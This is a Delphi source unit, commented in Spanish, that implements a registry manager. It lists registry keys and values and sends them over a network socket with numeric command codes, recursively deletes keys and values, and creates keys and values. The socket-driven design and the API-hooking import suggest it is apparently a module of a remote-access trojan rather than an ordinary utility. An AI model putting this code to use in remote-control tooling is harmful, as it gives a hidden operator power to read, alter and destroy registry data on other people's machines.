unit uRegistry;

interface
uses Windows,MagicApiHooks,winsock, uFunction;
type
  TRegistryman = class
  private
    function ToKey(Clave: String):HKEY;
  public
    function AniadirClave(Clave, Val, Tipo: String):boolean;
    function BorraClave(Clave: String):boolean;
    function ListarClaves(Clave: String; sSocket:integer): String;
    function ListarValues(Clave: String;sSocket:integer): String;
    function RegKeyExists(RootKey: HKEY; Name: string): boolean;
  end;
var
  Registryman: TRegistryman;
implementation
function TRegistryman.RegKeyExists(RootKey: HKEY; Name: string): boolean;
var
  hTemp: HKEY;
begin
  Result := False;
  if RegOpenKeyEx(RootKey, PChar(Name), 0, KEY_READ, hTemp) = ERROR_SUCCESS then
  begin
    Result := True;
    RegCloseKey(hTemp);
  end;
end;

function TRegistryman.ListarValues(Clave: String;sSocket:integer): String;
var
  phkResult: HKEY;
  dwIndex, lpcbValueName, lpcbData: Cardinal;
  lpData: PChar;
  lpType: DWORD;
  lpValueName: PChar;
  strTipo, strDatos, Nombre: String;
  j, Resultado: integer;
  DValue: PDWORD;
  Temp:string;
begin
  RegOpenKeyEx(ToKey(Copy(Clave, 1, Pos('\', Clave) - 1)),
               PChar(Copy(Clave, Pos('\', Clave) + 1, Length(Clave))),
               0, KEY_QUERY_VALUE, phkResult);
  dwIndex := 0;
  GetMem(lpValueName, 16383); //Longitud máxima del nombre de un valor: 16383
  Resultado := ERROR_SUCCESS;
  while (Resultado = ERROR_SUCCESS) do
  begin
    //Se guarda en lpcbData el tamaño del valor que vamor a leer
    RegEnumValue(phkResult, dwIndex, lpValueName, lpcbValueName, nil, @lpType, nil, @lpcbData);
    //Reservamos memoria
    GetMem(lpData, lpcbData);
    lpcbValueName := 16383;
    //Y ahora lo leemos
    Resultado := RegEnumValue(phkResult, dwIndex, lpValueName, lpcbValueName, nil, @lpType, PByte(lpData), @lpcbData);
    if Resultado = ERROR_SUCCESS then
    begin
      strDatos := '';
      if lpType = REG_DWORD  then
      begin
        DValue := PDWORD(lpData);
        strDatos := '0x'+ IntToHex(DValue^, 8) + ' (' + IntToStr(DValue^) + ')'; //0xHexValue (IntValue)
      end
      else
        if lpType = REG_BINARY then
        begin
          if lpcbData = 0 then
            strDatos := '(No Data)'
          else
            for j := 0 to lpcbData - 1 do
              strDatos:=strDatos + IntToHex(Ord(lpData[j]), 2) + ' ';  //4D 5A 00 10
        end
        else
          if lpType = REG_MULTI_SZ then
          begin
            for j := 0 to lpcbData - 1 do
              if lpData[j] = #0 then  //Fin de una cadena múltiple
                lpData[j] := ' ';
            strDatos := lpData;
          end
          else  //En caso de no ser DWORD, BINARY o MULTI_SZ copiar tal cual
            strDatos := lpData;
      if lpValueName[0] = #0 then //Primer caracter = fin de linea, cadena vacía
        Nombre := '(End)'
      else
        Nombre := lpValueName;
      case lpType of
        REG_BINARY: strTipo := 'REG_BINARY';
        REG_DWORD: strTipo := 'REG_DWORD';
        REG_DWORD_BIG_ENDIAN: strTipo := 'REG_DWORD_BIG_ENDIAN';
        REG_EXPAND_SZ: strTipo := 'REG_EXPAND_SZ';
        REG_LINK: strTipo := 'REG_LINK';
        REG_MULTI_SZ: strTipo := 'REG_MULTI_SZ';
        REG_NONE: strTipo := 'REG_NONE';
        REG_SZ: strTipo := 'REG_SZ';
      end;
      if strDatos = '' then strdatos := ' ';
      Temp := Temp + '|' + Nombre + '#' + strTipo + '#' + strDatos;
      Inc(dwIndex);
    end;
  end;
  RegCloseKey(phkResult);
  Temp := IntToStr(36) + Temp + #10;
  Send(sSocket, Temp[1], Length(Temp), 0);
end;

function TRegistryman.ListarClaves(Clave: String; sSocket:integer): String;
var
  phkResult: HKEY;
  lpName: PChar;
  lpcbName, dwIndex: Cardinal;
  lpftLastWriteTime: FileTime;
  Temp:string;
begin
  Temp := '';
  //Clave vale algo así: HKEY_LOCAL_MACHINE\SOFTWARE\
  RegOpenKeyEx(ToKey(Copy(Clave, 1, Pos('\', Clave) - 1)), //ToKey(HKEY_LOCAL_MACHINE)
               PChar(Copy(Clave, Pos('\', Clave) + 1, Length(Clave))), //SOFTWARE\
               0,
               KEY_ENUMERATE_SUB_KEYS,  //Los permisos justos y necesarios
               phkResult);
  lpcbName := 255; //Size limit of Key name 255 characters
  GetMem(lpName, lpcbName);
  dwIndex := 0;
  while RegEnumKeyEx(phkResult, dwIndex, @lpName[0] , lpcbName, nil, nil, nil, @lpftLastWriteTime) = ERROR_SUCCESS do
  begin
    temp := temp + lpName + '|';
    Inc(dwIndex);
    lpcbName := 255;
  end;
  result := temp;
  RegCloseKey(phkResult);
  Temp := IntToStr(35) + '|' + Temp + #10;
  Send(sSocket, Temp[1], Length(Temp), 0);
end;

function TRegistryman.ToKey(Clave: String):HKEY;
begin
  if Clave='HKEY_CLASSES_ROOT' then
    Result:=HKEY_CLASSES_ROOT
  else if Clave='HKEY_CURRENT_CONFIG' then
    Result:=HKEY_CURRENT_CONFIG
  else if Clave='HKEY_CURRENT_USER' then
    Result:=HKEY_CURRENT_USER
  else if Clave='HKEY_LOCAL_MACHINE' then
    Result:=HKEY_LOCAL_MACHINE
  else if Clave='HKEY_USERS' then
    Result:=HKEY_USERS
  else
    Result:=0;
end;

function TRegistryman.BorraClave(Clave: String):boolean;
var
  phkResult: HKEY;
  Valor: String;
  ClaveTemp, ClaveBase, SubClaves: String;
  Functions:TFunctions;
begin
  Functions := TFunctions.Create;
  ClaveTemp := Clave;                                     //ClaveTemp:= HKEY_LOCAL_MACHINE\SOFTWARE\ZETA\
  ClaveBase:=Copy(ClaveTemp, 1, Pos('\', ClaveTemp) - 1); //ClaveBase := HKEY_LOCAL_MACHINE
  Delete(ClaveTemp, 1, Pos('\', ClaveTemp));              //ClaveTemp := SOFTWARE\ZETA\
  if ClaveTemp[Length(ClaveTemp)]='\' then //Borrando CLAVE
  begin
    ClaveTemp:=Copy(ClaveTemp, 1, Length(ClaveTemp) - 1);  //Clave := SOFTWARE\ZETA
    Valor:=Copy(ClaveTemp, Functions.LastDelimiter('\', ClaveTemp) + 1, Length(ClaveTemp));  //Valor := ZETA
    Delete(ClaveTemp, Functions.LastDelimiter('\', ClaveTemp), Length(ClaveTemp)); //Clave := SOFTWARE
    RegOpenKeyEx(ToKey(ClaveBase), PChar(ClaveTemp), 0, KEY_WRITE, phkResult);
    if ListarClaves(Clave,0) = '' then  //No hay subclaves
      Result := (RegDeleteKey(phkResult, PChar(Valor)) = ERROR_SUCCESS)
    else  //Hay subclaves, tenemos que borrarlas antes de borrar la clave
    begin
      SubClaves := ListarClaves(Clave,0);
      while Pos('|', SubClaves)>0 do
      begin
        Result := BorraClave(Clave + Copy(SubClaves, 1, Pos('|', SubClaves) - 1) + '\');
        if Result = False then break;  //No seguimos borrando
        Delete(SubClaves, 1, Pos('|', SubClaves));
      end;
      //Una vez borradas las subclaves ahora podemos borrar la clave
      Result := (RegDeleteKey(phkResult, PChar(Valor)) = ERROR_SUCCESS)
    end;
  end
  else //Borrando VALOR por ejemplo: ////ClaveTemp:= SOFTWARE\ZETA\Value
  begin
    Valor:=Copy(ClaveTemp, Functions.LastDelimiter('\', ClaveTemp) + 1, Length(ClaveTemp));  //Valor := Value
    Delete(ClaveTemp, Functions.LastDelimiter('\', ClaveTemp), Length(ClaveTemp));  //ClaveTemp:= SOFTWARE\ZETA
    RegOpenKeyEx(ToKey(ClaveBase), PChar(ClaveTemp), 0, KEY_SET_VALUE, phkResult);
    Result := (RegDeleteValue(phkResult, PChar(Valor)) = ERROR_SUCCESS);
  end;
  RegCloseKey(phkResult);
  Functions.Free;
end;

function TRegistryman.AniadirClave(Clave, Val, Tipo: String):boolean;
var
  phkResult: HKEY;
  Valor: String;
  ClaveBase: String;
  Cadena: String;
  binary: Array of Byte;
  i: integer;
begin
  Result := False;
  ClaveBase := Copy(Clave, 1, Pos('\', Clave) - 1);
  Delete(Clave, 1, Pos('\', Clave));
  Valor := Copy(Clave, Functions.LastDelimiter('\', Clave) + 1, Length(Clave));
  Delete(Clave, Functions.LastDelimiter('\', Clave), Length(Clave));

  if Tipo = 'clave' then
  begin
    RegOpenKeyEx(ToKey(ClaveBase), PChar(Clave), 0, KEY_CREATE_SUB_KEY, phkResult);
    Result := (RegCreateKey(phkResult, PChar(Valor), phkResult) = ERROR_SUCCESS);
    RegCloseKey(phkResult);
    Exit;
  end;

  if RegOpenKeyEx(ToKey(ClaveBase), PChar(Clave), 0, KEY_SET_VALUE, phkResult) = ERROR_SUCCESS then
  begin
    if Tipo = 'REG_SZ' then
      Result := (RegSetValueEx(phkResult, Pchar(Valor), 0, REG_SZ, Pchar(Val), Length(Val)) = ERROR_SUCCESS);
    if Tipo = 'REG_BINARY' then
    begin
      if Val[Length(Val)] <> ' ' then Val := Val + ' ';
      Cadena := Val;
      i := 0;
      SetLength(binary, Length(Cadena) div 3);
      while Cadena <> '' do
      begin
        binary[i] := HexToInt(Copy(Cadena, 0, Pos(' ', Cadena) - 1));
        Delete(Cadena, 1, Pos(' ', Cadena) + 1);
        inc(i);
      end;
      Result := (RegSetValueEx(phkResult, Pchar(Valor), 0, REG_BINARY, @binary[0], Length(binary)) = ERROR_SUCCESS);
    end;
    if Tipo = 'REG_DWORD' then
    begin
      i := StrToInt(Val);
      Result := (RegSetValueEx(phkResult, Pchar(Valor), 0, REG_DWORD, @i, sizeof(i)) = ERROR_SUCCESS);
    end;
    if Tipo = 'REG_MULTI_SZ' then
    begin
      while Pos(#13#10, Val) > 0 do
        Val:=Copy(Val, 1, Pos(#13#10, Val) - 1) + #0+
                  Copy(Val, Pos(#13#10, Val) + 2, Length(Val));
      Val := Val + #0#0;
      Result := (RegSetValueEx(phkResult, Pchar(Valor), 0, REG_MULTI_SZ, PChar(Val), Length(Val)) = ERROR_SUCCESS);
    end;
    RegCloseKey(phkResult);
  end
  else
    Result := False;
end;
end.
